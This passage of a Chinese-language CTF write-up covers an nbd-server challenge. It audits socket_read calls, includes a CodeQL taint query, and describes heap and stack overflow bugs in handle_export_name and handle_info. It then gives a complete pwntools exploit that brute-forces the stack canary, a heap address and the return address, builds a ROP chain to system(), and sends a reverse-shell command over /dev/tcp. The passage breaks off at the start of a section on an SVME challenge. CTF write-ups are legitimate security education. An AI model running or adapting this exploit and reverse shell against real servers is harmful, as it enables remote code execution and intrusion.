+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Do the initial negotiation.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param net The socket we're doing the negotiation over.</span></span><br><span class="line"><span class="comment"> * @param servers The array of known servers.</span></span><br><span class="line"><span class="comment"> * @param genconf the global options (needed for accessing TLS config data)</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="function">CLIENT* <span class="title">negotiate</span><span class="params">(<span class="keyword">int</span> net, GArray* servers, struct generic_conf *genconf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> smallflags = NBD_FLAG_FIXED_NEWSTYLE | NBD_FLAG_NO_ZEROES;</span><br><span class="line">    <span class="keyword">uint64_t</span> magic;</span><br><span class="line">    <span class="keyword">uint32_t</span> cflags = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> opt;</span><br><span class="line">    <span class="comment">// 创建并初始化 client 结构体</span></span><br><span class="line">    CLIENT* client = g_new0(CLIENT, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 将 socket fd 赋给 cleint</span></span><br><span class="line">    client-&gt;net = net;</span><br><span class="line">    client-&gt;socket_read = socket_read_notls;</span><br><span class="line">    client-&gt;socket_write = socket_write_notls;</span><br><span class="line">    client-&gt;socket_closed = socket_closed_negotiate;</span><br><span class="line"></span><br><span class="line">    assert(servers != <span class="literal">NULL</span>);</span><br><span class="line">    socket_write(client, INIT_PASSWD, <span class="number">8</span>);</span><br><span class="line">    magic = htonll(opts_magic);</span><br><span class="line">    socket_write(client, &amp;magic, <span class="keyword">sizeof</span>(magic));</span><br><span class="line"></span><br><span class="line">    smallflags = htons(smallflags);</span><br><span class="line">    socket_write(client, &amp;smallflags, <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>));</span><br><span class="line">    <span class="comment">// 从 client 读取数据</span></span><br><span class="line">    socket_read(client, &amp;cflags, <span class="keyword">sizeof</span>(cflags));</span><br><span class="line">    cflags = htonl(cflags);</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这样，我们可以全局搜索 <code>socket_read</code>的使用并对其进行审计。该函数使用的次数不多，只有不到 20次，因此人工审计还是很快的。通过审计可以找到3个漏洞点。</p>
+<blockquote>
+<p>注意，审计时忽略了 TLS 相关的函数，因为远程不启用 TLS 交互。</p>
+</blockquote>
+<h4 id="b-漏洞">b. 漏洞</h4>
+<h5 id="0-codeql">0) codeql</h5>
+<blockquote>
+<p>author: sakura.</p>
+</blockquote>
+<p>顺手写了一下codeql的数据流分析，这里考虑两种简单写法，一种是将网络端序转换的函数例如htol作为source，然后<code>socket_read</code>作为sink点检查size溢出。</p>
+<p>另一种是将<code>socket_read</code>的第二个参数，这个接收用户输入的地方作为source点，然后将看能否污点到binary operation或者污点到<code>source_read</code>的第三个参数。</p>
+<p>这里写了下后者的QL。</p>
+<p>在写codeql的时候注意到QL的数据流分析其实是比较保守的，所以需要自己去连接一些边。</p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2022-01-26-074540.png" alt="sakuraimg"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.ir.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line">predicate htonlCallEdge(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">  exists(FunctionCall fc |</span><br><span class="line">    &#x2F;&#x2F; fc.getTarget().getName() &#x3D; &quot;htonl&quot; and</span><br><span class="line">    node1.asExpr() &#x3D; fc.getAnArgument() and</span><br><span class="line">    node2.asExpr() &#x3D; fc</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyDataFlowConfiguration extends TaintTracking::Configuration &#123;</span><br><span class="line">  MyDataFlowConfiguration() &#123; this &#x3D; &quot;MyDataFlowConfiguration&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    exists(FunctionCall fc | fc.getArgument(1) &#x3D; source.asExpr() |</span><br><span class="line">      fc.getTarget().hasGlobalName(&quot;socket_read&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    sink.asExpr().getLocation().toString().matches(&quot;%nbd-server%&quot;) and</span><br><span class="line">    sink.asExpr() instanceof BinaryArithmeticOperation</span><br><span class="line">    &#x2F;&#x2F; exists(FunctionCall fc | fc.getArgument(2) &#x3D; sink.asExpr() |</span><br><span class="line">    &#x2F;&#x2F;   fc.getTarget().hasGlobalName(&quot;socket_read&quot;)</span><br><span class="line">    &#x2F;&#x2F; )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">    htonlCallEdge(node1, node2)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from MyDataFlowConfiguration config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, &quot;&quot;</span><br></pre></td></tr></table></figure>
+<h5 id="1-handle-export-name">1) handle_export_name</h5>
+<p>一个<strong>整数溢出</strong>所造成的<strong>堆溢出漏洞点</strong>位于 <code>handle_export_name</code> 函数中：</p>
+<blockquote>
+<p>可以造成任意长度的堆溢出。</p>
+</blockquote>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> CLIENT* <span class="title">handle_export_name</span><span class="params">(CLIENT* client, <span class="keyword">uint32_t</span> opt, GArray* servers, <span class="keyword">uint32_t</span> cflags)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> namelen;</span><br><span class="line">    <span class="keyword">char</span>* name;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">// 从 client 读入 namelen</span></span><br><span class="line">    socket_read(client, &amp;namelen, <span class="keyword">sizeof</span>(namelen));</span><br><span class="line">    namelen = ntohl(namelen);</span><br><span class="line">    <span class="keyword">if</span>(namelen &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 这里没有做整数溢出判断，因此如果 namelen 为 0xffffffff，那么实际 malloc 的 size 为 0</span></span><br><span class="line">        <span class="comment">// 因此这里会造成堆溢出</span></span><br><span class="line">        name = <span class="built_in">malloc</span>(namelen+<span class="number">1</span>);</span><br><span class="line">        name[namelen]=<span class="number">0</span>;</span><br><span class="line">        socket_read(client, name, namelen);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        name = strdup(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="2-handle-info">2) handle_info</h5>
+<p>该函数中有两个漏洞点，其中一个还是和上面类似的<strong>堆溢出</strong>：</p>
+<blockquote>
+<p>还是可以造成任意长度的堆溢出。</p>
+</blockquote>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">handle_info</span><span class="params">(CLIENT* client, <span class="keyword">uint32_t</span> opt, GArray* servers, <span class="keyword">uint32_t</span> cflags)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> namelen, len;</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    SERVER *server = <span class="literal">NULL</span>;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    [...]</span><br><span class="line"></span><br><span class="line">    socket_read(client, &amp;len, <span class="keyword">sizeof</span>(len));</span><br><span class="line">    len = htonl(len);</span><br><span class="line">    <span class="comment">// 1. 从远程读入 namelen</span></span><br><span class="line">    socket_read(client, &amp;namelen, <span class="keyword">sizeof</span>(namelen));</span><br><span class="line">    namelen = htonl(namelen);</span><br><span class="line">    <span class="keyword">if</span>(namelen &gt; (len - <span class="number">6</span>)) &#123;</span><br><span class="line">        send_reply(client, opt, NBD_REP_ERR_INVALID, <span class="number">-1</span>, <span class="string">"An OPT_INFO request cannot be smaller than the length of the name + 6"</span>);</span><br><span class="line">        socket_read(client, buf, len - <span class="keyword">sizeof</span>(namelen));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(namelen &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 2. 没有判断便直接加1，执行 malloc(0) 造成堆溢出</span></span><br><span class="line">        name = <span class="built_in">malloc</span>(namelen + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// *. 缺点，需要做风水绕过 0xffffffff 的越界写，因为这里可能会造成 SIGSEGV。</span></span><br><span class="line">        name[namelen] = <span class="number">0</span>;</span><br><span class="line">        socket_read(client, name, namelen);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        name = strdup(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>还有一个是<strong>溢出长度不受限的栈溢出</strong>：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">handle_info</span><span class="params">(CLIENT* client, <span class="keyword">uint32_t</span> opt, GArray* servers, <span class="keyword">uint32_t</span> cflags)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> namelen, len;</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    SERVER *server = <span class="literal">NULL</span>;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    [...]</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 从远程读入 len</span></span><br><span class="line">    socket_read(client, &amp;len, <span class="keyword">sizeof</span>(len));</span><br><span class="line">    len = htonl(len);</span><br><span class="line">    <span class="comment">// 2. 从远程读入 namelen</span></span><br><span class="line">    socket_read(client, &amp;namelen, <span class="keyword">sizeof</span>(namelen));</span><br><span class="line">    namelen = htonl(namelen);</span><br><span class="line">    <span class="comment">// 3. 进入 if 分支</span></span><br><span class="line">    <span class="keyword">if</span>(namelen &gt; (len - <span class="number">6</span>)) &#123;</span><br><span class="line">        send_reply(client, opt, NBD_REP_ERR_INVALID, <span class="number">-1</span>, <span class="string">"An OPT_INFO request cannot be smaller than the length of the name + 6"</span>);</span><br><span class="line">        <span class="comment">// 4. 从 client 读入数据，由于 len 可控，因此可以造成栈溢出</span></span><br><span class="line">        socket_read(client, buf, len - <span class="keyword">sizeof</span>(namelen));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(namelen &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        name = <span class="built_in">malloc</span>(namelen + <span class="number">1</span>);</span><br><span class="line">        name[namelen] = <span class="number">0</span>;</span><br><span class="line">        socket_read(client, name, namelen);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        name = strdup(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="4-利用流程-2">4. 利用流程</h3>
+<ul>
+<li>
+<p>首先，连接远程，并手动构造恶意数据字段，触发栈溢出，爆破出 Canary 和 PIE，进而计算出$addr_{ELF-base}、addr_{GOT}、addr_{system}、addr_{gadgets}$等等。</p>
+</li>
+<li>
+<p>leak 出这些后，我们需要将待执行的 cmd 传递给 system 函数。但我们发来的所有数据都存储在 heap 中，cmd 自然也不例外，因此我们还需要 leak 出堆地址。</p>
+<p>注意到 <code>handle_info</code> 函数栈上存放了一个 old r12 数据，指向 client，我们可以试着爆破这个栈上数据来获取堆地址。</p>
+<blockquote>
+<p>需要注意的是，连接远程时是使用 socket 进行通信，因此 cmd 不能是直接的 <code>cat /flag</code>，必须将所执行命令的 stdout 导入到我们连接的 socket fd 上。</p>
+<p>最简单的方式就是<strong>反弹 shell</strong>至我们的主机上。</p>
+</blockquote>
+</li>
+<li>
+<p>最后使用 ROP 一把梭。</p>
+</li>
+</ul>
+<h3 id="5-Exploit">5. Exploit</h3>
+<p>这题 exploit 有点意思，所以本人试着自己动手写了下：</p>
+<blockquote>
+<p>注意，exp 中的偏移量等使用的是自编译的 nbd-server。</p>
+<p>由于本人根据远程的保护，在编译时对等开启了相应的保护，因此实际上编译出的 nbd-server 和远程的 binary，其内部偏移几乎无差别，因此该 exp 只需简单改改部分偏移量即可解远程 binary。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(</span><br><span class="line">    terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>],</span><br><span class="line">    os=<span class="string">'linux'</span>,</span><br><span class="line">    arch=<span class="string">'amd64'</span>,</span><br><span class="line">    encoding=<span class="string">'latin'</span>,</span><br><span class="line">    endian=<span class="string">"little"</span>,       <span class="comment"># 注意：网络端序是大端序</span></span><br><span class="line">    log_level=<span class="string">"info"</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">stack layout:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- 0x400 bytes buf</span></span><br><span class="line"><span class="string">- 8 bytes unknown field</span></span><br><span class="line"><span class="string">- canary</span></span><br><span class="line"><span class="string">- 8 bytes unknown field</span></span><br><span class="line"><span class="string">- old_rbx</span></span><br><span class="line"><span class="string">- old_rbp</span></span><br><span class="line"><span class="string">- old_r12 : client_addr</span></span><br><span class="line"><span class="string">- old_r13</span></span><br><span class="line"><span class="string">- old_r14</span></span><br><span class="line"><span class="string">- old_r15</span></span><br><span class="line"><span class="string">- return addr</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_new_request</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10809</span>)</span><br><span class="line">    cmd = <span class="string">b' '</span>*<span class="number">0x25</span> + <span class="string">b"sleep 5; bash -c \"bash -i &gt;&amp; /dev/tcp/127.0.0.1/8001 0&gt;&amp;1\""</span></span><br><span class="line">    </span><br><span class="line">    p.send(p32(<span class="number">0</span>, endian=<span class="string">"big"</span>))                  <span class="comment"># cflags</span></span><br><span class="line">    p.send(<span class="string">b"IHAVEOPT"</span>)                           <span class="comment"># opt_magic</span></span><br><span class="line">    p.send(p32(<span class="number">7</span>, endian=<span class="string">"big"</span>))                  <span class="comment"># opt: NBD_OPT_GO</span></span><br><span class="line">    p.send(p32(len(payload) + <span class="number">4</span>, endian=<span class="string">"big"</span>))   <span class="comment"># len</span></span><br><span class="line"></span><br><span class="line">    namelen = len(payload)</span><br><span class="line">    p.send(p32(namelen, endian=<span class="string">"big"</span>))            <span class="comment"># namelen (&gt; (len - 6))</span></span><br><span class="line">    </span><br><span class="line">    p.send(payload)                               <span class="comment"># payload</span></span><br><span class="line"></span><br><span class="line">    padding_len = namelen - len(cmd)</span><br><span class="line">    <span class="keyword">assert</span> padding_len &gt;= <span class="number">0</span></span><br><span class="line">    p.send(cmd + <span class="string">b'\x00'</span>*padding_len)             <span class="comment"># name 指针，用于存放执行 system 函数的命令参数</span></span><br><span class="line"></span><br><span class="line">    p.send(p16(<span class="number">0</span>, endian=<span class="string">"big"</span>))                  <span class="comment"># n_requests</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit_stack_data</span><span class="params">(payload, target_len=<span class="number">8</span>)</span>:</span></span><br><span class="line">    data = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">while</span> len(data) &lt; target_len:</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            p = send_new_request(payload + data + p8(ch))</span><br><span class="line">            p.clean()</span><br><span class="line"></span><br><span class="line">            log.info(<span class="string">"Getting stack mem: "</span> + \</span><br><span class="line">                hex(int.from_bytes(data,byteorder=<span class="string">'little'</span>)) + \</span><br><span class="line">                <span class="string">", ch: "</span> + str(ch))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p.recv(timeout=<span class="number">1</span>)</span><br><span class="line">                p.close()</span><br><span class="line">                data += p8(ch)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> EOFError:</span><br><span class="line">                p.close()</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    b2i = <span class="keyword">lambda</span> addr : int.from_bytes(addr,byteorder=<span class="string">'little'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">        canary = p64(<span class="number">0x5af9ebae046ded00</span>)</span><br><span class="line">        client_addr = p64(<span class="number">0x555cbd36c9b0</span>)</span><br><span class="line">        ret_addr = p64(<span class="number">0x555cbbb901b7</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        canary = <span class="literal">None</span></span><br><span class="line">        client_addr = <span class="literal">None</span></span><br><span class="line">        ret_addr = p8(<span class="number">0xb7</span>) <span class="comment"># 手动指定最后一个字节，提高爆破精度</span></span><br><span class="line">    ret_addr_offset = <span class="number">0x91B7</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> canary <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        canary = exploit_stack_data(<span class="string">b'a'</span>*<span class="number">0x408</span>, target_len=<span class="number">8</span>)</span><br><span class="line">        log.info(<span class="string">"================================="</span>)</span><br><span class="line">        log.success(<span class="string">"canary: "</span> + hex(b2i(canary)))</span><br><span class="line">        input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> client_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        client_addr = exploit_stack_data(<span class="string">b'a'</span>*<span class="number">0x408</span> + canary + <span class="string">b'b'</span>*<span class="number">0x18</span>, target_len=<span class="number">8</span>)</span><br><span class="line">        log.info(<span class="string">"================================="</span>)</span><br><span class="line">        log.success(<span class="string">"client addr: "</span> + hex(b2i(client_addr)))</span><br><span class="line">        input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(ret_addr) &lt; <span class="number">8</span>:</span><br><span class="line">        ret_addr += exploit_stack_data(</span><br><span class="line">            <span class="string">b'a'</span>*<span class="number">0x408</span> + canary + <span class="string">b'b'</span>*<span class="number">0x18</span> + client_addr + <span class="string">b'c'</span>*<span class="number">0x18</span> + ret_addr, target_len=<span class="number">7</span>)</span><br><span class="line">        log.info(<span class="string">"================================="</span>)</span><br><span class="line">        log.success(<span class="string">"ret addr: "</span> + hex(b2i(ret_addr)))</span><br><span class="line">        input()</span><br><span class="line"></span><br><span class="line">    elf = ELF(<span class="string">"./nbd-server"</span>)</span><br><span class="line">    elf.address = b2i(ret_addr) - ret_addr_offset</span><br><span class="line">    log.success(<span class="string">"ELF base addr: "</span> + hex(elf.address))</span><br><span class="line">    <span class="keyword">assert</span> elf.address &amp; <span class="number">0xfff</span> == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    elf_rop = ROP(elf)</span><br><span class="line">    elf_rop.system(b2i(client_addr) + <span class="number">0x180</span>)</span><br><span class="line">    print(elf_rop.dump())</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"Try getting reverse shell"</span>)</span><br><span class="line">    p = send_new_request(<span class="string">b'a'</span>*<span class="number">0x408</span> + canary + <span class="string">b'b'</span>*<span class="number">0x18</span> + client_addr + <span class="string">b'c'</span>*<span class="number">0x18</span> + elf_rop.chain())</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+<p>坑点主要在于<strong>爆破</strong>。整个 exp 中爆破是重中之重，但在低地址字节处的爆破容易产生误报，因此最好多爆破几次。需要爆破的数据主要有以下三点：</p>
+<ul>
+<li>
+<p>canary 爆破：错1个字节就直接 abort，这在爆破上是件好事，最容易爆破的数据。</p>
+</li>
+<li>
+<p>ret address 爆破：需要手动指定最低地址的那个字节，以提高爆破精度。低地址 1 字节的值可以通过 IDA 得知（注意页对齐大小为 0x1000）。</p>
+</li>
+<li>
+<p>client address 爆破：由于调用 handle_info 函数时，调用者会将 client 的地址压入栈上（old r12)，因此在离开 handle_info 之前，需要执行<code>pop r12</code>指令。我们可以尝试对该 r12 进行爆破，以获取到 client 地址，并根据相对偏移获取存储 system 命令的 name 内存地址。</p>
+<p>注意点</p>
+<ul>
+<li>由于程序中较多使用 socket_read 函数，该函数会使用到 client 上的函数指针，因此 client 地址哪怕偏移一个字节都会造成 SIGSEGV，这在爆破上是一件好事。</li>
+<li>但是在实际爆破过程中，client addr 是比较容易误报的，需要仔细甄别。</li>
+</ul>
+</li>
+</ul>
+<h2 id="四、SVME">四、SVME</h2>
+<h3 id="1-SVME-小叙">1. SVME 小叙</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Professor Terence Parr has taught us how to build a virtual machine. Now it&#39;s time to break it!</span><br><span class="line">nc 47.243.140.252 1337</span><br><span class="line">attachment</span><br><span class="line"></span><br><span class="line">Clone-and-Pwn, Virtual Machine, difficulty:baby</span><br></pre></td></tr></table></figure>
+<p>一个简易的开源 VM，baby 难度。</p>
+<h3 id="2-SVME-环境搭建">2. SVME 环境搭建</h3>
+<p>题目给了一个 <a href="http://libc-2.31.so" target="_blank" rel="noopener">libc-2.31.so</a> 附件和 main.c ：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"vm.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> code[<span class="number">128</span>], nread = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (nread &lt; <span class="keyword">sizeof</span>(code)) &#123;</span><br><span class="line">        <span class="keyword">int</span> ret = read(<span 